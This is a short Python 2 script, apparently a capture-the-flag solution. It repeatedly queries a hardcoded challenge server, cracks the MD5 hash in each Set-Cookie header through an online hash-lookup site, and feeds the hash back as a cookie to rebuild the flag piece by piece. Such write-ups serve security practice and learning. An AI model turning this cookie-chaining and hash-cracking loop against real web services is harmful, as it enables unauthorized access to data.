#!/usr/bin/env python
import ctfpwn

url = 'http://159.89.166.12:13500/'

flag = ""
h = {
    'User-Agent': '',
    'Connection': 'Close',
    "Cookie": "flag=x"
}

while not '}' in flag:
    hash = ctfpwn.get_http_response_header(url, "Set-Cookie", h).split('=')[1]
    flag_fragment = ctfpwn.http_get('http://www.nitrxgen.net/md5db/' + hash)
    print "found part of the flag: {}".format(flag_fragment)
    flag = flag + flag_fragment
    h = {
        'User-Agent': 'ctfpwn by bl4de',
        'Connection': 'Close',
        'Cookie' : "flag={}".format(hash)
    }

print flag
